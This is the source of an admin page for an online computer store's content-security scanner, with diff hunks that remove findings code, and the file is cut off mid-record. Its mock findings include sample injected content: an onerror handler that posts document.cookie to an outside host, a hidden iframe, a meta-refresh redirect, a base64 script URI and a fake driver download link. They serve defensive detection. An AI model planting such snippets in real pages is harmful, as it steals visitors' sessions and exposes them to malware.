<!-- File: /pages/admin/content-security/index.vue -->
<script setup lang="ts">
import { ref, computed, watch, onMounted } from 'vue';
import { useRoute, useRouter } from '#app';
import { 
  Shield, 
  ShieldAlert, 
  ShieldCheck, 
  AlertTriangle, 
  AlertOctagon, 
  CheckCircle2, 
  Search, 
  Play, 
  RefreshCw, 
  Filter, 
  Layers, 
  Package, 
  ExternalLink, 
  Eye, 
  Edit3, 
  Check, 
  X, 
  Plus, 
  Trash2, 
  Code2, 
  Globe2, 
  FileText, 
  SlidersHorizontal, 
  ArrowRight, 
  Info,
  Clock,
  Sparkles,
  ChevronRight,
  MoreVertical,
  RotateCcw,
  Loader2,
  Calendar,
  User,
  Hash,
  Activity,
  FileCode,
  CheckCircle,
  XCircle,
  AlertCircle
} from 'lucide-vue-next';
import { cn } from '@/utils';
import { toastSuccess, toastInfo, toastWarning, toastError, extractErrorMessage } from '@/composables/useToast';
import UiTable, { type UiTableColumn } from '@/components/ui/UiTable.vue';
import UiPagination from '@/components/ui/UiPagination.vue';
import UiAdminModal from '@/components/ui/UiAdminModal.vue';
import UiBadge from '@/components/ui/UiBadge.vue';
import UiButton from '@/components/ui/Button.vue';
import { refDebounced } from '@vueuse/core';
import { useContentSecurityService } from '@/composables/useContentSecurityService';
import { useProductService } from '@/composables/useProductService';
import { useCategoryService } from '@/composables/useCategoryService';
import { useBrandService } from '@/composables/useBrandService';
import { useBlogService } from '@/composables/useBlogService';
import { useAdminPermissions } from '@/composables/useAdminPermissions';
import { useAdminModalState } from '@/composables/useAdminModalState';

// Extracted Detection Rules Components
import DetectionRuleCreateModal from '@/features/admin/content-security/components/DetectionRuleCreateModal.vue';
import KeywordRulesTab from '@/features/admin/content-security/components/KeywordRulesTab.vue';
import DomainRulesTab from '@/features/admin/content-security/components/DomainRulesTab.vue';
import HiddenContentRulesTab from '@/features/admin/content-security/components/HiddenContentRulesTab.vue';
import ObfuscationRulesTab from '@/features/admin/content-security/components/ObfuscationRulesTab.vue';
import RedirectRulesTab from '@/features/admin/content-security/components/RedirectRulesTab.vue';
import HtmlAttributeRulesTab from '@/features/admin/content-security/components/HtmlAttributeRulesTab.vue';
import HtmlTagRulesTab from '@/features/admin/content-security/components/HtmlTagRulesTab.vue';
import FindingsTab from '@/features/admin/content-security/components/FindingsTab.vue';

import type { 
  KeywordRule, 
  KeywordRuleDetail, 
  KeywordCategory, 
  KeywordMatchType, 
  KeywordSeverity, 
  CreateKeywordRulePayload,
  UpdateKeywordRulePayload,
  DomainRule,
  DomainRuleDetail,
  DomainMatchType,
  CreateDomainRulePayload,
  UpdateDomainRulePayload,
  DomainRulesQueryParams,
  HiddenContentRule,
  HiddenContentRuleDetail,
  CreateHiddenContentRulePayload,
  UpdateHiddenContentRulePayload,
  HiddenContentRulesQueryParams,
  ObfuscationRule,
  ObfuscationRuleDetail,
  CreateObfuscationRulePayload,
  UpdateObfuscationRulePayload,
  ObfuscationRulesQueryParams,
  RedirectRule,
  RedirectRuleDetail,
  CreateRedirectRulePayload,
  UpdateRedirectRulePayload,
  RedirectRulesQueryParams,
  HtmlAttributeRule,
  HtmlAttributeRuleDetail,
  CreateHtmlAttributeRulePayload,
  UpdateHtmlAttributeRulePayload,
  HtmlAttributeRulesQueryParams,
  HtmlTagRule,
  HtmlTagRuleDetail,
  CreateHtmlTagRulePayload,
  UpdateHtmlTagRulePayload,
  HtmlTagRulesQueryParams,
  PaginatedHtmlTagRules,
  ContentScan,
  ContentScansQueryParams,
  ContentScanRunRequest,
  ContentScanDetail,
  ContentScanFindingDetail,
  ContentScanFindingReviewRequest,
  ContentScanFindingResolveRequest,
  ContentScanFindingListItem,
  ContentScanFindingsQueryParams,
  DetectionRulesSummary
} from '@/types';

definePageMeta({
  layout: 'admin'
});

useSeoMeta({
  title: 'Content Security - Best Computer Hub Admin',
  robots: 'noindex, nofollow'
});

// ==========================================
// Types
// ==========================================
export type SecurityStatus = 'Clean' | 'Needs Review' | 'High Risk' | 'Critical' | 'Resolved';
export type SecuritySeverity = 'Low' | 'Medium' | 'High' | 'Critical';
export type ContentType = 'Product' | 'Category';
export type DetectorType = 'Keyword' | 'Domain' | 'HTML' | 'Attribute' | 'Redirect' | 'Hidden Content' | 'Obfuscation';

export interface SecurityFinding {
  id: string;
  contentType: ContentType;
  contentId: string | number;
  contentName: string;
  contentSlug: string;
  categoryName?: string;
  field: string;
  riskScore: number;
  status: SecurityStatus;
  severity: SecuritySeverity;
  detector: DetectorType;
  ruleName: string;
  description: string;
  matchedValue: string;
  contextSnippetBefore: string;
  contextSnippetMatched: string;
  contextSnippetAfter: string;
  lineOffset: number;
  scannedAt: string;
  storefrontUrl: string;
  adminEditUrl: string;
}

export interface DetectionRule {
  id: string;
  type: 'keyword' | 'domain' | 'hidden_content' | 'obfuscation' | 'html' | 'attribute' | 'redirect';
  pattern: string;
  category: string;
  severity: SecuritySeverity;
  description: string;
  enabled: boolean;
  matchCount: number;
  updatedAt: string;
}

// ==========================================
// State Management
// ==========================================
const mainTab = ref<'overview' | 'results' | 'findings' | 'rules'>('overview');
const rulesSubTab = ref<'keywords' | 'domains' | 'hidden_content' | 'obfuscation' | 'html' | 'attributes' | 'redirects'>('keywords');

const { hasPermission } = useAdminPermissions();
const canViewKeywords = computed(() => hasPermission('content_security.view_keywordrule'));
const canAddKeywordRule = computed(() => hasPermission('content_security.add_keywordrule'));
const canEditKeywordRule = computed(() => hasPermission('content_security.change_keywordrule'));
const canDeleteKeywordRule = computed(() => hasPermission('content_security.delete_keywordrule'));

const canViewDomains = computed(() => hasPermission('content_security.view_domainrule'));
const canAddDomainRule = computed(() => hasPermission('content_security.add_domainrule'));
const canEditDomainRule = computed(() => hasPermission('content_security.change_domainrule'));
const canDeleteDomainRule = computed(() => hasPermission('content_security.delete_domainrule'));

const canViewHiddenContent = computed(() => hasPermission('content_security.view_hiddencontentrule'));
const canAddHiddenContentRule = computed(() => hasPermission('content_security.add_hiddencontentrule'));
const canEditHiddenContentRule = computed(() => hasPermission('content_security.change_hiddencontentrule'));
const canDeleteHiddenContentRule = computed(() => hasPermission('content_security.delete_hiddencontentrule'));

const canViewObfuscation = computed(() => hasPermission('content_security.view_obfuscationrule'));
const canAddObfuscationRule = computed(() => hasPermission('content_security.add_obfuscationrule'));
const canEditObfuscationRule = computed(() => hasPermission('content_security.change_obfuscationrule'));
const canDeleteObfuscationRule = computed(() => hasPermission('content_security.delete_obfuscationrule'));

const canViewRedirects = computed(() => hasPermission('content_security.view_redirectrule'));
const canAddRedirectRule = computed(() => hasPermission('content_security.add_redirectrule'));
const canEditRedirectRule = computed(() => hasPermission('content_security.change_redirectrule'));
const canDeleteRedirectRule = computed(() => hasPermission('content_security.delete_redirectrule'));

const canViewHtmlAttributeRules = computed(() => hasPermission('content_security.view_htmlattributerule'));
const canAddHtmlAttributeRule = computed(() => hasPermission('content_security.add_htmlattributerule'));
const canEditHtmlAttributeRule = computed(() => hasPermission('content_security.change_htmlattributerule'));
const canDeleteHtmlAttributeRule = computed(() => hasPermission('content_security.delete_htmlattributerule'));

const canViewHtmlTagRules = computed(() => hasPermission('content_security.view_htmltagrule'));
const canAddHtmlTagRule = computed(() => hasPermission('content_security.add_htmltagrule'));
const canEditHtmlTagRule = computed(() => hasPermission('content_security.change_htmltagrule'));
const canDeleteHtmlTagRule = computed(() => hasPermission('content_security.delete_htmltagrule'));

const canViewContentScans = computed(() => hasPermission('content_security.view_contentscan'));
const canRunContentScan = computed(() => hasPermission('content_security.run_content_scan'));
const canViewFindings = computed(() => hasPermission('content_security.view_contentscanfinding'));
const canReviewFinding = computed(() => hasPermission('content_security.review_content_scan_finding'));
const canResolveFinding = computed(() => hasPermission('content_security.resolve_content_scan_finding'));

const contentSecurityService = useContentSecurityService();
const isKeywordsLoading = computed(() => contentSecurityService.isLoading.value);
const keywordsError = computed(() => contentSecurityService.error.value);

// Detection Rules Summary State
const detectionRulesSummary = ref<DetectionRulesSummary>({
  keyword_rules: 0,
  domain_rules: 0,
  hidden_content_rules: 0,
  obfuscation_rules: 0,
  redirect_rules: 0,
  html_attribute_rules: 0,
  html_tag_rules: 0,
  total: 0
});
const isDetectionRulesSummaryLoading = ref(false);

const fetchDetectionRulesSummary = async () => {
  if (
    !canViewKeywords.value &&
    !canViewDomains.value &&
    !canViewHiddenContent.value &&
    !canViewObfuscation.value &&
    !canViewRedirects.value &&
    !canViewHtmlAttributeRules.value &&
    !canViewHtmlTagRules.value
  ) {
    return;
  }

  isDetectionRulesSummaryLoading.value = true;
  try {
    const data = await contentSecurityService.getDetectionRulesSummary();
    detectionRulesSummary.value = data;
  } catch (err: any) {
    // Handled in service
  } finally {
    isDetectionRulesSummaryLoading.value = false;
  }
};

// Detection Rule Modals/Tabs State
const isCreateModalOpen = ref(false);
const createModalInitialType = ref<'keyword' | 'domain' | 'hidden_content' | 'obfuscation' | 'redirect' | 'attribute' | 'html'>('keyword');

const handleOpenCreateModal = (type: any) => {
  createModalInitialType.value = type;
  isCreateModalOpen.value = true;
};

const handleRuleCreated = () => {
  isCreateModalOpen.value = false;
  fetchDetectionRulesSummary();
};

const openAddRuleModal = (type: any) => {
  handleOpenCreateModal(type);
};

// Rules query and fetching are fully managed by the extracted tab panels.

[diff_block_start]
@@ -286,143 +286,0 @@
-// ==========================================
-// Findings Query/Data States
-// ==========================================
-const isFindingsLoading = ref(false);
-const findingsError = ref<string | null>(null);
-const findingSearchQuery = ref('');
-const debouncedFindingSearch = refDebounced(findingSearchQuery, 300);
-const findingContentType = ref<string>('all');
-const findingSeverity = ref<string>('all');
-const findingDetector = ref<string>('all');
-const findingCategory = ref<string>('all');
-const findingReviewStatus = ref<string>('all');
-const findingOrdering = ref<string>('-created_at');
-const findingPage = ref(1);
-const findingPageSize = ref(10);
-const findingsData = ref<ContentScanFindingListItem[]>([]);
-const findingsCount = ref(0);
-const findingsPages = ref(1);
-
-const findingColumns: UiTableColumn<ContentScanFindingListItem>[] = [
-  { key: 'id', label: 'Finding ID', width: '100px', headerClass: 'px-4 py-3 whitespace-nowrap', cellClass: 'px-4 py-3 whitespace-nowrap font-mono text-xs font-semibold' },
-  { key: 'scan', label: 'Scan ID', width: '100px', headerClass: 'px-4 py-3 whitespace-nowrap', cellClass: 'px-4 py-3 whitespace-nowrap font-mono text-xs text-muted-foreground' },
-  { key: 'severity', label: 'Severity', width: '120px', headerClass: 'px-4 py-3 whitespace-nowrap', cellClass: 'px-4 py-3 whitespace-nowrap' },
-  { key: 'review_status', label: 'Review Status', width: '140px', headerClass: 'px-4 py-3 whitespace-nowrap', cellClass: 'px-4 py-3 whitespace-nowrap' },
-  { key: 'content_type', label: 'Type', width: '110px', headerClass: 'px-4 py-3 whitespace-nowrap', cellClass: 'px-4 py-3 whitespace-nowrap text-xs font-semibold' },
-  { key: 'object_id', label: 'Object ID', width: '100px', headerClass: 'px-4 py-3 whitespace-nowrap', cellClass: 'px-4 py-3 whitespace-nowrap font-mono text-xs' },
-  { key: 'field_name', label: 'Field', width: '120px', headerClass: 'px-4 py-3 whitespace-nowrap', cellClass: 'px-4 py-3 whitespace-nowrap font-mono text-xs' },
-  { key: 'detector', label: 'Detector', width: '130px', headerClass: 'px-4 py-3 whitespace-nowrap', cellClass: 'px-4 py-3 whitespace-nowrap text-xs font-medium' },
-  { key: 'category', label: 'Category', width: '130px', headerClass: 'px-4 py-3 whitespace-nowrap', cellClass: 'px-4 py-3 whitespace-nowrap text-xs' },
-  { key: 'matched_value', label: 'Matched Value', width: '180px', headerClass: 'px-4 py-3 whitespace-nowrap', cellClass: 'px-4 py-3 font-mono text-xs' },
-  { key: 'message', label: 'Message', width: '220px', headerClass: 'px-4 py-3 whitespace-nowrap', cellClass: 'px-4 py-3 text-xs text-muted-foreground' },
-  { key: 'created_at', label: 'Created At', width: '140px', headerClass: 'px-4 py-3 whitespace-nowrap', cellClass: 'px-4 py-3 whitespace-nowrap text-xs text-muted-foreground font-mono' },
-  { key: 'actions', label: '', width: '60px', headerClass: 'px-4 py-3', cellClass: 'px-4 py-3 text-right' }
-];
-
-const resetFindingFilters = () => {
-  findingSearchQuery.value = '';
-  findingContentType.value = 'all';
-  findingSeverity.value = 'all';
-  findingDetector.value = 'all';
-  findingCategory.value = 'all';
-  findingReviewStatus.value = 'all';
-  findingOrdering.value = '-created_at';
-  findingPage.value = 1;
-};
-
-const fetchFindings = async () => {
-  if (!canViewFindings.value) return;
-
-  isFindingsLoading.value = true;
-  findingsError.value = null;
-
-  try {
-    const params: ContentScanFindingsQueryParams = {
-      page: findingPage.value,
-      page_size: findingPageSize.value,
-      ordering: findingOrdering.value !== '-created_at' ? findingOrdering.value : undefined
-    };
-
-    if (debouncedFindingSearch.value.trim()) {
-      params.search = debouncedFindingSearch.value.trim();
-    }
-    if (findingContentType.value !== 'all') {
-      params.content_type = findingContentType.value;
-    }
-    if (findingSeverity.value !== 'all') {
-      params.severity = findingSeverity.value;
-    }
-    if (findingDetector.value !== 'all') {
-      params.detector = findingDetector.value;
-    }
-    if (findingCategory.value !== 'all') {
-      params.category = findingCategory.value;
-    }
-    if (findingReviewStatus.value !== 'all') {
-      params.review_status = findingReviewStatus.value;
-    }
-
-    const response = await contentSecurityService.getContentScanFindings(params);
-    findingsData.value = response.results;
-    findingsCount.value = response.count;
-    findingsPages.value = response.pages;
-  } catch (err: any) {
-    findingsError.value = extractErrorMessage(err, 'Failed to retrieve content scan findings.');
-  } finally {
-    isFindingsLoading.value = false;
-  }
-};
-
-const getFindingReviewStatusBadge = (status?: string | null) => {
-  const s = status?.toUpperCase() || 'PENDING';
-  switch (s) {
-    case 'NEEDS_REVIEW':
-    case 'PENDING':
-      return { variant: 'warning' as const, label: 'Needs Review', class: 'bg-amber-500/10 text-amber-600 dark:text-amber-400 border-amber-500/30' };
-    case 'APPROVED':
-    case 'CONFIRMED':
-    case 'SUSPICIOUS':
-      return { variant: 'error' as const, label: 'Confirmed Risk', class: 'bg-rose-500/10 text-rose-600 dark:text-rose-400 border-rose-500/30' };
-    case 'RESOLVED':
-      return { variant: 'info' as const, label: 'Resolved', class: 'bg-blue-500/10 text-blue-600 dark:text-blue-400 border-blue-500/30' };
-    case 'FALSE_POSITIVE':
-    case 'SAFE':
-    case 'WHITELISTED':
-      return { variant: 'success' as const, label: 'Safe / Whitelisted', class: 'bg-emerald-500/10 text-emerald-600 dark:text-emerald-400 border-emerald-500/30' };
-    default:
-      return { variant: 'secondary' as const, label: status || 'Unknown', class: 'bg-muted text-muted-foreground border-border' };
-  }
-};
-
[diff_block_end]


const getSeverityBadge = (severity?: string) => {
  switch (severity?.toUpperCase()) {
    case 'CRITICAL':
      return 'bg-rose-500/10 text-rose-600 border-rose-500/20';
    case 'HIGH':
      return 'bg-orange-500/10 text-orange-600 border-orange-500/20';
    case 'MEDIUM':
      return 'bg-amber-500/10 text-amber-600 border-amber-500/20';
    case 'LOW':
      return 'bg-blue-500/10 text-blue-600 border-blue-500/20';
    case 'INFO':
    default:
      return 'bg-slate-500/10 text-slate-600 border-slate-500/20';
  }
};

const getStatusBadge = (status?: string) => {
  switch (status) {
    case 'Critical':
      return { icon: AlertOctagon, label: 'Critical' };
    case 'High Risk':
      return { icon: ShieldAlert, label: 'High Risk' };
    case 'Needs Review':
      return { icon: AlertTriangle, label: 'Needs Review' };
    case 'Clean':
    default:
      return { icon: ShieldCheck, label: 'Clean' };
  }
};

const scanResultColumns: UiTableColumn<ContentScan>[] = [
  { key: 'id', label: 'Scan ID', width: '90px', headerClass: 'px-4 py-3 whitespace-nowrap', cellClass: 'px-4 py-3 whitespace-nowrap font-mono text-xs font-semibold' },
  { key: 'content_type', label: 'Target / Scope', width: '150px', headerClass: 'px-4 py-3 whitespace-nowrap', cellClass: 'px-4 py-3 whitespace-nowrap text-xs font-semibold' },
  { key: 'status', label: 'Status', width: '130px', headerClass: 'px-4 py-3 whitespace-nowrap', cellClass: 'px-4 py-3 whitespace-nowrap' },
  { key: 'risk_score', label: 'Risk Score', width: '140px', headerClass: 'px-4 py-3 whitespace-nowrap', cellClass: 'px-4 py-3 whitespace-nowrap' },
  { key: 'finding_count', label: 'Findings', width: '100px', headerClass: 'px-4 py-3 whitespace-nowrap', cellClass: 'px-4 py-3 whitespace-nowrap font-mono text-xs' },
  { key: 'scanned_at', label: 'Scanned At', width: '180px', headerClass: 'px-4 py-3 whitespace-nowrap', cellClass: 'px-4 py-3 whitespace-nowrap' },
  { key: 'actions', label: '', width: '60px', headerClass: 'px-4 py-3', cellClass: 'px-4 py-3 text-right' }
];

// URL Routing/Query Management
const route = useRoute();
const router = useRouter();

const syncFromRoute = () => {
  if (route.query.mainTab) mainTab.value = route.query.mainTab as any;
  if (route.query.subTab) {
    if (route.query.subTab === 'hidden-content') {
      rulesSubTab.value = 'hidden_content';
    } else {
      rulesSubTab.value = route.query.subTab as any;
    }
  }

  if (mainTab.value === 'findings') {
    if (route.query.search) findingSearchQuery.value = String(route.query.search);
    if (route.query.content_type) findingContentType.value = String(route.query.content_type);
    if (route.query.severity) findingSeverity.value = String(route.query.severity);
    if (route.query.detector) findingDetector.value = String(route.query.detector);
    if (route.query.category) findingCategory.value = String(route.query.category);
    if (route.query.review_status) findingReviewStatus.value = String(route.query.review_status);
    if (route.query.ordering) findingOrdering.value = String(route.query.ordering);
    if (route.query.page) findingPage.value = parseInt(String(route.query.page)) || 1;
    if (route.query.page_size) findingPageSize.value = parseInt(String(route.query.page_size)) || 10;
  }
};

const updateRouteQuery = () => {
  const query: Record<string, any> = { ...route.query };

  query.mainTab = mainTab.value !== 'overview' ? mainTab.value : undefined;
  query.subTab = mainTab.value === 'rules' && rulesSubTab.value !== 'keywords' ? rulesSubTab.value : undefined;

  if (mainTab.value === 'findings') {
    query.search = findingSearchQuery.value || undefined;
    query.content_type = findingContentType.value !== 'all' ? findingContentType.value : undefined;
    query.severity = findingSeverity.value !== 'all' ? findingSeverity.value : undefined;
    query.detector = findingDetector.value !== 'all' ? findingDetector.value : undefined;
    query.category = findingCategory.value !== 'all' ? findingCategory.value : undefined;
    query.review_status = findingReviewStatus.value !== 'all' ? findingReviewStatus.value : undefined;
    query.ordering = findingOrdering.value !== '-created_at' ? findingOrdering.value : undefined;
    query.page = findingPage.value !== 1 ? String(findingPage.value) : undefined;
    query.page_size = findingPageSize.value !== 10 ? String(findingPageSize.value) : undefined;
  } else {
    delete query.search;
    delete query.category;
    delete query.severity;
    delete query.match_type;
    delete query.is_active;
    delete query.is_enabled;
    delete query.ordering;
    delete query.page;
    delete query.page_size;
  }

  router.replace({ query });
};

// Initial Sync
[diff_block_start]
@@ -456,12 +456,6 @@
 onMounted(() => {
   syncFromRoute();
   fetchDetectionRulesSummary();
-  if (canViewContentScans.value && mainTab.value === 'results') {
-    fetchContentScans();
-  }
-  if (canViewFindings.value && mainTab.value === 'findings') {
-    fetchFindings();
-  }
 });
 
 // Reactively watch finding filters & trigger fetch
@@ -482,7 +476,6 @@
   updateRouteQuery();
   if (mainTab.value === 'findings') {
-    fetchFindings();
   }
 });
 
@@ -501,7 +494,6 @@
     fetchContentScans();
   } else if (mainTab.value === 'findings') {
-    fetchFindings();
   }
 });


// Formatting helpers
const formatDate = (dateStr?: string | null): string => {
  if (!dateStr) return 'N/A';
  try {
    const d = new Date(dateStr);
    if (isNaN(d.getTime())) return String(dateStr);
    return new Intl.DateTimeFormat('en-US', {
      year: 'numeric',
      month: 'short',
      day: 'numeric'
    }).format(d);
  } catch {
    return String(dateStr);
  }
};

// Scan State
const isScanning = ref(false);
const isRunScanModalOpen = ref(false);
const scanProgress = ref(0);
const scanStepText = ref('');
const lastScanTimestamp = ref('14 minutes ago');
const totalEntitiesScanned = ref(4306);

// Findings Mock Data
const findings = ref<SecurityFinding[]>([
  {
    id: 'SEC-1092',
    contentType: 'Product',
    contentId: '101',
    contentName: 'ASUS ROG Strix GeForce RTX 4090 OC Edition 24GB',
    contentSlug: 'asus-rog-strix-geforce-rtx-4090-oc-edition-24gb',
    categoryName: 'Graphics Cards',
    field: 'description',
    riskScore: 98,
    status: 'Critical',
    severity: 'Critical',
    detector: 'Domain',
    ruleName: 'Blacklisted Promo Host',
    description: 'Blacklisted affiliate casino and promo redirect domain found embedded in description hyperlink.',
    matchedValue: 'https://casino-example.com/bonus-claim?ref=9982',
    contextSnippetBefore: '...equipped with axial-tech fan technology and a patented vapor chamber. For official claims, rebates and rewards visit ',
    contextSnippetMatched: 'https://casino-example.com/bonus-claim?ref=9982',
    contextSnippetAfter: ' to register your warranty and redeem exclusive cashback immediately...',
    lineOffset: 42,
    scannedAt: '2026-08-25 11:52 UTC',
    storefrontUrl: '/product/asus-rog-strix-geforce-rtx-4090-oc-edition-24gb/',
    adminEditUrl: '/admin/products?modal=edit&id=101'
  },
  {
    id: 'SEC-1088',
    contentType: 'Product',
    contentId: '104',
    contentName: 'MSI Katana 15 B13V 15.6" 144Hz Gaming Laptop',
    contentSlug: 'msi-katana-15-b13v-gaming-laptop',
    categoryName: 'Gaming Laptops',
    field: 'specifications',
    riskScore: 92,
    status: 'Critical',
    severity: 'Critical',
    detector: 'HTML',
    ruleName: 'Disallowed iframe Injection',
    description: 'Dangerous inline <iframe> tag with cross-origin external tracking source detected in specification table.',
    matchedValue: '<iframe src="https://tracker-telemetry.biz/embed.html" width="0" height="0"></iframe>',
    contextSnippetBefore: '...Display: 15.6" FHD 144Hz IPS-Level Display. ',
    contextSnippetMatched: '<iframe src="https://tracker-telemetry.biz/embed.html" width="0" height="0"></iframe>',
    contextSnippetAfter: ' Operating System: Windows 11 Home Advanced Edition...',
    lineOffset: 18,
    scannedAt: '2026-08-25 11:48 UTC',
    storefrontUrl: '/product/msi-katana-15-b13v-gaming-laptop/',
    adminEditUrl: '/admin/products?modal=edit&id=104'
  },
  {
    id: 'SEC-1074',
    contentType: 'Product',
    contentId: '109',
    contentName: 'Corsair Vengeance RGB DDR5 32GB (2x16GB) 6000MHz CL36',
    contentSlug: 'corsair-vengeance-rgb-ddr5-32gb-6000mhz',
    categoryName: 'Memory / RAM',
    field: 'description',
    riskScore: 84,
    status: 'High Risk',
    severity: 'High',
    detector: 'Attribute',
    ruleName: 'Dangerous Inline onerror Handler',
    description: 'Inline JavaScript event attribute `onerror` detected inside custom HTML image element.',
    matchedValue: 'onerror="fetch(\'https://telemetry-log.net/p\', {method:\'POST\',body:document.cookie})"',
    contextSnippetBefore: '...features dynamic ten-zone RGB lighting. <img src="cor-vengeance.png" ',
    contextSnippetMatched: 'onerror="fetch(\'https://telemetry-log.net/p\', {method:\'POST\',body:document.cookie})"',
    contextSnippetAfter: ' class="w-full h-auto" /> Designed for high-frequency overclocking...',
    lineOffset: 27,
    scannedAt: '2026-08-25 11:40 UTC',
    storefrontUrl: '/product/corsair-vengeance-rgb-ddr5-32gb-6000mhz/',
    adminEditUrl: '/admin/products?modal=edit&id=109'
  },
  {
    id: 'SEC-1065',
    contentType: 'Category',
    contentId: '18',
    contentName: 'High Performance Gaming Laptops',
    contentSlug: 'gaming-laptops',
    categoryName: 'Laptops',
    field: 'category_description',
    riskScore: 78,
    status: 'High Risk',
    severity: 'High',
    detector: 'Redirect',
    ruleName: 'External Meta Refresh Redirect',
    description: 'Meta refresh tag detected directing traffic away to unapproved third-party landing page.',
    matchedValue: '<meta http-equiv="refresh" content="3;url=https://free-giveaway-zone.xyz">',
    contextSnippetBefore: '...Explore the premier collection of portable computing rigs. ',
    contextSnippetMatched: '<meta http-equiv="refresh" content="3;url=https://free-giveaway-zone.xyz">',
    contextSnippetAfter: ' Top-rated brands including ASUS, MSI, Razer, and Lenovo...',
    lineOffset: 5,
    scannedAt: '2026-08-25 11:34 UTC',
    storefrontUrl: '/product-category/gaming-laptops/',
    adminEditUrl: '/admin/categories?modal=edit&id=18'
  },
  {
    id: 'SEC-1052',
    contentType: 'Product',
    contentId: '115',
    contentName: 'Samsung 990 PRO 2TB PCIe 4.0 NVMe M.2 SSD',
    contentSlug: 'samsung-990-pro-2tb-pcie-4-nvme-m2-ssd',
    categoryName: 'Storage / SSD',
    field: 'short_description',
    riskScore: 71,
    status: 'High Risk',
    severity: 'High',
    detector: 'Domain',
    ruleName: 'Unverified External File Host',
    description: 'Link pointing to known unverified file downloading portal in short description.',
    matchedValue: 'https://free-file-vault-dl.com/driver-installer.exe',
    contextSnippetBefore: '...Sequential read speeds up to 7,450 MB/s. Official driver package: ',
    contextSnippetMatched: 'https://free-file-vault-dl.com/driver-installer.exe',
    contextSnippetAfter: ' for Windows 10 and 11 installation...',
    lineOffset: 12,
    scannedAt: '2026-08-25 11:22 UTC',
    storefrontUrl: '/product/samsung-990-pro-2tb-pcie-4-nvme-m2-ssd/',
    adminEditUrl: '/admin/products?modal=edit&id=115'
  },
  {
    id: 'SEC-1044',
    contentType: 'Product',
    contentId: '122',
    contentName: 'Logitech G Pro X Superlight 2 Wireless Gaming Mouse',
    contentSlug: 'logitech-g-pro-x-superlight-2',
    categoryName: 'Peripherals / Mice',
    field: 'description',
    riskScore: 58,
    status: 'Needs Review',
    severity: 'Medium',
    detector: 'Keyword',
    ruleName: 'Blacklisted Keyword match: "free crypto giveaway"',
    description: 'Suspicious spam keyword combination detected in customer review snippet or seller note.',
    matchedValue: 'free crypto giveaway',
    contextSnippetBefore: '...Featuring HERO 2 Sensor with 32,000 DPI. Enter our seasonal ',
    contextSnippetMatched: 'free crypto giveaway',
    contextSnippetAfter: ' by adding this product to your public wishlist today...',
    lineOffset: 34,
    scannedAt: '2026-08-25 11:15 UTC',
    storefrontUrl: '/product/logitech-g-pro-x-superlight-2/',
    adminEditUrl: '/admin/products?modal=edit&id=122'
  },
  {
    id: 'SEC-1039',
    contentType: 'Category',
    contentId: '24',
    contentName: 'Mechanical Keyboards & Switches',
    contentSlug: 'keyboards-switches',
    categoryName: 'Peripherals',
    field: 'category_description',
    riskScore: 52,
    status: 'Needs Review',
    severity: 'Medium',
    detector: 'Hidden Content',
    ruleName: 'Invisible Font Zero-Size Div',
    description: 'Hidden zero-pixel div element containing keyword stuffing detected.',
    matchedValue: '<div style="font-size:0px;color:transparent;display:none;">cheap laptops free keys</div>',
    contextSnippetBefore: '...Custom hot-swappable mechanical keyboards and enthusiast switches. ',
    contextSnippetMatched: '<div style="font-size:0px;color:transparent;display:none;">cheap laptops free keys</div>',
    contextSnippetAfter: ' Browse tactile, linear, and clicky switches...',
    lineOffset: 9,
    scannedAt: '2026-08-25 11:02 UTC',
    storefrontUrl: '/product-category/keyboards-switches/',
    adminEditUrl: '/admin/categories?modal=edit&id=24'
  },
  {
    id: 'SEC-1025',
    contentType: 'Product',
    contentId: '130',
    contentName: 'NZXT Kraken Elite 360 RGB Liquid CPU Cooler with LCD Display',
    contentSlug: 'nzxt-kraken-elite-360-rgb',
    categoryName: 'Cooling / AIO',
    field: 'description',
    riskScore: 46,
    status: 'Needs Review',
    severity: 'Medium',
    detector: 'Obfuscation',
    ruleName: 'Base64 Encoded JS Data URI',
    description: 'Obfuscated Base64 data URI string detected inside hyperlink tag.',
    matchedValue: 'data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==',
    contextSnippetBefore: '...Equipped with custom pump and high-res LCD screen. Sample gif: <a href="',
    contextSnippetMatched: 'data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==',
    contextSnippetAfter: '">Click for animation preview</a>...',
    lineOffset: 55,
    scannedAt: '2026-08-25 10:45 UTC',
    storefrontUrl: '/product/nzxt-kraken-elite-360-rgb/',
    adminEditUrl: '/admin/products?modal=edit&id=130'
  },
  {
    id: 'SEC-1018',
    contentType: 'Product',
    contentId: '142',
    contentName: 'Seasonic Focus GX-850 850W 80+ Gold Full Modular PSU',
    contentSlug: 'seasonic-focus-gx-850-psu',
    categoryName: 'Power Supplies',
    field: 'specifications',
    riskScore: 28,
    status: 'Needs Review',
    severity: 'Low',
    detector: 'Keyword',
    ruleName: 'Suspicious External Contact Token',
    description: 'Direct Telegram/WhatsApp handle found in specification field bypassing official support channel.',
    matchedValue: 't.me/direct_tech_support_bot',
    contextSnippetBefore: '...Warranty: 10 Years Manufacturer Warranty. For immediate claims contact: ',
    contextSnippetMatched: 't.me/direct_tech_support_bot',
    contextSnippetAfter: ' or visit Seasonic global portal...',
    lineOffset: 14,
    scannedAt: '2026-08-25 10:30 UTC',
    storefrontUrl: '/product/seasonic-focus-gx-850-psu/',
    adminEditUrl: '/admin/products?modal=edit&id=142'
  },
  {
    id: 'SEC-1010',
    contentType: 'Product',
    contentId: '150',
    contentName: 'Lian Li O11 Dynamic EVO Mid-Tower Case - Black',
    contentSlug: 'lian-li-o11-dynamic-evo',
    categoryName: 'PC Cases',
    field: 'description',
    riskScore: 0,
    status: 'Clean',
    severity: 'Low',
    detector: 'HTML',
    ruleName: 'Standard Clean Inspection',
    description: 'All HTML tags sanitized and compliant with Storefront standards.',
    matchedValue: 'None',
    contextSnippetBefore: '...Dual chamber chassis with flexible configuration. ',
    contextSnippetMatched: 'Compliant HTML',
    contextSnippetAfter: ' Supports up to 3x 360mm radiators...',
    lineOffset: 1,
    scannedAt: '2026-08-25 10:15 UTC',
    storefrontUrl: '/product/lian-li-o11-dynamic-evo/',
    adminEditUrl: '/admin/products?modal=edit&id=150'
  },
  {
    id: 'SEC-1004',
    contentType: 'Product',
    contentId: '155',
    contentName: 'AMD Ryzen 7 7800X3D 8-Core 16-Thread Desktop Processor',
    contentSlug: 'amd-ryzen-7-7800x3d',
    categoryName: 'Processors / CPU',
    field: 'description',
    riskScore: 0,
    status: 'Resolved',
    severity: 'Low',
    detector: 'Domain',
    ruleName: 'Prior Flag Resolved',
    description: 'Previously flagged unverified link corrected by staff administrator.',
